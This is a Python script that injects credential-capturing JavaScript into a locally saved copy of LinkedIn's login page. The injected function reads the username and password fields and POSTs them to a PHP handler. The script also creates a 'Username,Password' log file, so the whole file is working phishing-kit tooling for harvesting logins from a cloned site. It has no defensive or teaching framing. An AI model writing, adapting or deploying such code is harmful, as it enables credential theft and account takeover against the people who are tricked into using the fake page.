from bs4 import BeautifulSoup
import os

# Get the directory where the script is located
base_dir = os.path.dirname(os.path.abspath(__file__))

# Construct the path to the index.html file relative to the base directory
path = os.path.join(base_dir, 'www.linkedin.com', 'index.html')

# Define the JavaScript code to be inserted
js_code = """
<script>
function saveUserInput() {
  var username = document.getElementById("username").value;
  var password = document.getElementById("password").value;
  var xhr = new XMLHttpRequest();
  xhr.open("POST", "save_user_input.php", true);
  xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
  xhr.send("username=" + username + "&password=" + password);
}
</script>
"""

# Open the file and read its contents
with open(path, "r", encoding='utf-8') as html:
    soup = BeautifulSoup(html, "html.parser")

    # find the input fields in the HTML file
    username_field = soup.find("input", {"name": "username"})
    password_field = soup.find("input", {"name": "password"})

    # check if the input fields exist in the HTML file
    if username_field and password_field:
        # insert the JavaScript code before the closing </body> tag
        body_tag = soup.find('body')
        body_tag.append(BeautifulSoup(js_code, 'html.parser'))

# Write the modified HTML to a new file
with open(os.path.join(base_dir, 'www.linkedin.com', 'index_new.html'), "w", encoding='utf-8') as new_html:
    new_html.write(str(soup))

# Create the userinput.txt file
with open(os.path.join(base_dir, 'userinput.txt'), "w") as userinput_file:
    userinput_file.write("Username,Password\n")
